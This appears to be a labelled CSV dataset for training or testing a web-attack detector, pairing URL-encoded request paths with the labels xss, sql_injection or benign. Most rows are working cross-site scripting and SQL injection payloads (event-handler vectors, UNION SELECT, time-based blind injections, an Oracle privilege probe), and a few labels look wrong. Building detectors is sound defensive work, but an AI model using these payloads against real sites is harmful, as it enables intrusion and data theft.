text,label
/api/v1/users?id=%3B+exec+xp_regread,sql_injection
/api/v1/reviews?body=%3Cscript%3Ealert%28document.head.innerHTML.substr%28146%2C20%29%29%3B%3C%2Fscript%3E,xss
/api/v2/comments/%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cbase+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fbase%3E,xss
/api/v1/comments?text=%3Cdir+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdir%3E,xss
/v1/search?q=%3CSCRIPT+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E,xss
/api/v1/login?username=x%27+AND+email+IS+NULL%3B+--&password=pass,sql_injection
/api/v1/users?id=PRINT+%40%40variable,sql_injection
/api/v2/comments/%3Cdfn+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fdfn%3E%3Cinput+autofocus%3E,xss
/api/v1/reviews?body=%3Clegend+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Flegend%3E,xss
/api/v1/cart?user_id=285167&action=view,benign
/api/v1/comments?text=%3Cbasefont+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fbasefont%3E,xss
/api/v1/comments?text=%3Cfigcaption+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Ffigcaption%3E,xss
/api/v1/search?q=%27sqlattempt1,sql_injection
/v1/search?q=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ctitle+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Ftitle%3E,xss
/v1/search?q=%3Crp+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Frp%3E,xss
/v1/products/%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--,sql_injection
/v1/orders?customer_id=%27+group+by+username+having+1%3D1--&status=active,sql_injection
/api/v1/search?q=%22+or+1%3D1%23,sql_injection
/api/v1/reviews?body=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cfigure+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Ffigure%3E,xss
/v1/profile?bio=%3Cli+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fli%3E,xss
/api/v1/comments?text=%3Cp+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fp%3E,xss
/api/v2/profile?id=%3Cform+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fform%3E,xss
/v1/orders?customer_id=ORDER+BY+25--&status=active,sql_injection
/api/v1/users?id=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7,sql_injection
/api/v2/items/red+phone?key=433378,benign
/v1/profile?bio=%3Cdt+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdt%3E,xss
/api/v1/orders?customer_id=132379,benign
/api/v1/feedback?message=%3Cmark+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fmark%3E,xss
/api/v2/profile?id=%3Cdfn+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fdfn%3E,xss
/v1/products/1,sql_injection
/api/v1/search?q=%27%3B+if+not%28substring%28%28select+%40%40version%29%2C25%2C1%29+%3C%3E+0%29+waitfor+delay+%270%3A0%3A2%27+--,sql_injection
/v1/profile?bio=%3Coption+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Foption%3E,xss
/api/v2/profile?id=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cvar+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fvar%3E,xss
/api/v1/comments?text=%3Cbig+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fbig%3E,xss
/api/v1/feedback?message=%3Coptgroup+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Foptgroup%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cdetails+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fdetails%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cspan+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fspan%3E,xss
/api/v2/comments/%3Cscript+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fscript%3E,xss
/v1/profile?bio=%3Cx+oncontextmenu%3Dalert%281%29%3Eright+click+this%21,xss
/v1/products/UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19,sql_injection
/api/v1/feedback?message=%3Chtml+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fhtml%3E,xss
/v1/search?q=%3Cdatalist+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fdatalist%3E,xss
/api/v1/reviews?body=%3Canimation+xlink%3Ahref%3D%22javascript%3Aalert%2888%29%22%2F%3E,xss
/v1/profile?bio=%3Cstrike+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fstrike%3E,xss
/api/v1/comments?text=%3Ccenter+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcenter%3E,xss
/v1/profile?bio=%3Ccol+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fcol%3E,xss
/api/v2/profile?id=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cimage+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fimage%3E,xss
/v1/search?q=%3Cnav+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fnav%3E,xss
/v1/search?q=%3Cdd+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdd%3E,xss
/v1/search?q=%3C%21+foo%3D%22%3E%3Cscript%3Ealert%2891%29%3C%2Fscript%3E%22%3E,xss
/api/v2/comments/%3Csvg%3E%3Caddress+onload%3Dalert%281%29%3E%3C%2Faddress%3E,xss
/api/v2/comments/%3Cdiv+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fdiv%3E%3Cinput+autofocus%3E,xss
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cacronym+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Facronym%3E,xss
/api/v2/items/or+%27unusual%27+%3D+%27unusual%27?key=API_KEY,sql_injection
/api/v2/comments/%3Cb+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fb%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Ccommand+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fcommand%3E,xss
/api/v1/users/186066,benign
/api/v2/comments/%3Cfooter+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Ffooter%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v2/comments/%3Ca+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fa%3E%3Cinput+autofocus%3E,xss
/v1/profile?bio=%3Cmeter+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fmeter%3E,xss
/v1/profile?bio=%3Carticle+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Farticle%3E,xss
/api/v2/search?q=OR+x%3Dx&key=API_KEY,sql_injection
/v1/search?q=%3Cdel+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fdel%3E,xss
/v1/products/UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15--,sql_injection
/v1/search?q=%3Cdel+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fdel%3E,xss
/api/v1/feedback?message=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cfigure+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Ffigure%3E,xss
/api/v1/reviews?body=%3Cxmp+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fxmp%3E,xss
/v1/profile?bio=%3Crtc+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Frtc%3E,xss
/api/v1/search?q=116277,benign
/api/v1/feedback?message=%3Cisindex+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fisindex%3E,xss
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ctable+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Ftable%3E,xss
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cbasefont+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fbasefont%3E,xss
/api/v1/reviews?body=%3Ccite+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fcite%3E,xss
/api/v1/reviews?body=%3Cbig+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbig%3E,xss
/api/v1/search?q=gaming+laptop,benign
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Chgroup+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fhgroup%3E,xss
/v1/search?q=%3Cdd+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fdd%3E,xss
/api/v2/search?q=%27%29+or+sleep%285%29%3D%27&key=API_KEY,sql_injection
/api/v2/comments/%3Cdir+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fdir%3E,xss
/api/v1/login?username=%29%29+or+sleep%28__TIME__%29%3D%22%22%22&password=pass,sql_injection
/api/v2/profile?id=%3Cx+onclick%3Dalert%281%29%3Eclick+this%21,xss
/api/v1/comments?text=%3Cvideo+onclick%3D%22alert%281%29%22%3Etest%3C%2Fvideo%3E,xss
/api/v2/comments/%3Cwbr+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fwbr%3E,xss
/api/v2/comments/%3Cu+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fu%3E,xss
/api/v1/reviews?body=%3Csvg+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fsvg%3E%3Cinput+autofocus%3E,xss
/api/v1/feedback?message=%3Cdl+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdl%3E,xss
/v1/products/UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%23,sql_injection
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cframeset+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fframeset%3E,xss
/api/billing/items?api-version=2025-11-13-preview,benign
/api/v1/comments?text=%3Cnoembed+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fnoembed%3E,xss
/admin/api/2024-04/orders/4171539.json,benign
/api/v1/reviews?body=%3Cnoscript+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnoscript%3E,xss
/api/v2/comments/%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cb+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fb%3E,xss
/v1/search?q=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cslot+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fslot%3E,xss
/api/v2/comments/%3Ccol+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fcol%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Ctrack+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Ftrack%3E,xss
/api/v1/login?username=OR+x%3Dx&password=pass,sql_injection
/v1/search?q=%3Crb+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Frb%3E,xss
/v1/search?q=%3Crtc+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Frtc%3E,xss
/api/v1/search?q=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29,sql_injection
/api/v2/comments/%3Caddress+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Faddress%3E,xss
/api/v2/search?q=%27%7C%7C%28elt%28-3%2B5%2Cbin%2815%29%2Cord%2810%29%2Chex%28char%2845%29%29%29%29&key=API_KEY,sql_injection
/api/v1/comments?text=%3Cform%3E%3Cinput+type%3Dsearch+onsearch%3Dalert%281%29+value%3D%22Hit+return%22+autofocus%3E,xss
/api/v1/reviews?body=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Coptgroup+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Foptgroup%3E,xss
/v1/search?q=%3Cbody+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbody%3E,xss
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cstrike+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fstrike%3E,xss
/api/v1/feedback?message=%3Ca+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fa%3E,xss
/api/v1/reviews?body=%3Cnobr+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnobr%3E,xss
/api/v2/profile?id=%3Cbgsound+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fbgsound%3E,xss
/api/v1/reviews?body=%3Ciframe++src%3D%22data%3Atext%2Fhtml%2C%253C%2573%2563%2572%2569%2570%2574%253E%2561%256C%2565%2572%2574%2528%2531%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E%22%3E%3C%2Fiframe%3E,xss
/api/v1/reviews?body=%3Cmenuitem+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmenuitem%3E,xss
/api/v1/reviews?body=%3Cb+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fb%3E,xss
/api/v1/reviews?body=%3Chead+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fhead%3E,xss
/api/v1/orders/111448,benign
/api/v1/feedback?message=%3Cembed+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fembed%3E,xss
/api/v1/search?q=%27+,sql_injection
/api/v2/search?q=APIKEY123&key=845329,benign
/api/v2/comments/%3Cshadow+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fshadow%3E,xss
/v1/profile?bio=%3Cform+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fform%3E,xss
/api/v2/profile?id=%3Cdd+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fdd%3E,xss
/api/v2/search?q=ORDER+BY+30--&key=API_KEY,sql_injection
/api/v2/search?q=%27+or+%27text%27+%3D+n%27text%27&key=API_KEY,sql_injection
/api/v1/feedback?message=%3Cth+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fth%3E,xss
/v1/search?q=%3Cacronym+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Facronym%3E,xss
/api/v1/comments?text=%3Cform+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fform%3E,xss
/api/v2/comments/%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Csource+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fsource%3E,xss
/api/v1/feedback?message=%3Cparam+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fparam%3E,xss
/api/v2/profile?id=%3Cmulticol+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmulticol%3E,xss
/v1/customers/cus_321275,benign
/v1/search?q=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cselect+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fselect%3E,xss
/api/v1/reviews?body=%3Ckeygen+autofocus+onfocus%3Dalert%281%29%3E,xss
/api/v1/reviews?body=%3Csvg%3E%3Csource+onload%3Dalert%281%29%3E%3C%2Fsource%3E,xss
/api/v1/user/73373,benign
/v1/search?q=%3Cdd+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdd%3E,xss
/v1/profile?bio=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4-,xss
/api/v1/feedback?message=%3Cblink+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fblink%3E,xss
/api/v1/feedback?message=%3Cfieldset+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Ffieldset%3E,xss
/api/v1/login?username=and+%28select+substring%28%40%40version%2C1%2C1%29%29%3D%27X%27&password=pass,sql_injection
/api/v2/profile?id=%3Ccode+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcode%3E,xss
/api/v1/reviews?body=%3Cdiv+id%3D%2299%22%3EXXX%3Cstyle%3E,xss
/api/v1/comments?text=%3Cnobr+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fnobr%3E,xss
/api/v1/reviews?body=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Col+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fol%3E,xss
/api/v2/profile?id=%3Csamp+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fsamp%3E,xss
/api/v1/search?q=%27%29%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A,sql_injection
/api/v1/users?id=%27%29%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--,sql_injection
/api/service/items?api-version=2025-11-13,benign
/api/v2/comments/%3Ctitle+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Ftitle%3E%3Cinput+autofocus%3E,xss
/v1/search?q=%3Ctd+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Ftd%3E,xss
/api/v2/items/ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18--?key=API_KEY,sql_injection
/api/v1/users/619177,benign
/api/v1/users?id=%27+AND+1%3Dutl_inaddr.get_host_address%28%28SELECT+DISTINCT%28granted_role%29+FROM+%28SELECT+DISTINCT%28granted_role%29%2C+ROWNUM+AS+LIMIT+FROM+dba_role_privs+WHERE+GRANTEE%3DSYS.LOGINUSER%29+WHERE+LIMIT%3D1%29%29+AND+%27i%27%3D%27i,sql_injection
/api/v2/profile?id=%3Cimage+style%3D%27filter%3Aurl%28%22data%3Aimage%2Fsvg%2Bxml%2C%3Csvg+xmlns%3D%2522http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%2522%3E%3Cscript%3Eparent.alert%28129%29%3C%2Fscript%3E%3C%2Fsvg%3E%22%29%27%3E,xss
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Carea+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Farea%3E,xss
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cfieldset+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Ffieldset%3E,xss
/v1/profile?bio=%3Cq+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fq%3E%3Cinput+id%3Dy+autofocus%3E,xss
/v1/profile?bio=%3Cform+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fform%3E,xss
/api/v1/comments?text=%3Caudio+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Faudio%3E,xss
/api/v1/profile?id=133086,benign
/api/v2/comments/%3Cdiv+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdiv%3E,xss
/v1/search?q=95479,benign
/api/v1/reviews?body=%3Cmeter+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fmeter%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cth+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fth%3E,xss
/api/v2/search?q=%22%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520--&key=API_KEY,sql_injection
/api/v1/reviews?body=%3Clisting+onclick%3D%22alert%281%29%22%3Etest%3C%2Flisting%3E,xss
/api/v2/items/186267?key=KEY-0001,benign
/api/v1/comments?text=%3Cbr+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbr%3E,xss
/api/v1/comments?text=%3Csvg%3E%3Cshadow+onload%3Dalert%281%29%3E%3C%2Fshadow%3E,xss
/api/v1/reviews?body=%3Ctime+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Ftime%3E,xss
/api/v1/feedback?message=%3Chgroup+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fhgroup%3E,xss
/api/v1/reviews?body=%3Cnoframes+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnoframes%3E,xss
/api/v2/profile?id=%3Ctt+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Ftt%3E,xss
/api/v2/comments/%3CTABLE+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,xss
/api/v2/comments/%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cfooter+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Ffooter%3E,xss
/api/v1/reviews?body=%3Cdiv+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fdiv%3E,xss
/api/v2/comments/%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Csub+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fsub%3E,xss
/api/v2/profile?id=%3Caudio+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Faudio%3E,xss
/api/v1/search?q=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%29%2520%2F%2A,sql_injection
/api/v1/reviews?body=%3Carticle+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Farticle%3E,xss
/api/v2/profile?id=%3Cnoembed+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fnoembed%3E,xss
/api/v1/search?q=ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%23,sql_injection
/api/v2/comments/%3Csource+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fsource%3E,xss
/api/v1/feedback?message=%3Ctime+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Ftime%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v2/profile?id=%3Cvar+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fvar%3E,xss
/api/v1/comments?text=%3Cmarquee+width%3D1+loop%3D1+onfinish%3Dalert%281%29%3EXSS%3C%2Fmarquee%3E,xss
/api/v2/users/70248,benign
/api/v1/reviews?body=%3Ccenter+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcenter%3E,xss
/v1/profile?bio=%3Clabel+dataformatas%3D%22html%22+datasrc%3D%22%23xss%22+datafld%3D%22payload%22%3E%3C%2Flabel%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E,xss
/api/v1/users?id=%22%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%29%2520%2F%2A,sql_injection
/api/v1/reviews?body=%3Cruby+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fruby%3E,xss
/api/v2/comments/%3Csub+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsub%3E,xss
/v1/orders?customer_id=OR+3409%3D3409+AND+%28%27pytW%27+LIKE+%27pytW&status=active,sql_injection
/api/v1/login?username=or+%277659%27%3D%277659&password=pass,sql_injection
/api/v2/comments/%3Csmall+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsmall%3E,xss
/api/v2/profile?id=%3Crt+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Frt%3E,xss
/prod/users/10966/orders,benign
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cpicture+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fpicture%3E,xss
/api/v1/feedback?message=%3Cnobr+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnobr%3E,xss
/v1/search?q=%3Cins+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fins%3E,xss
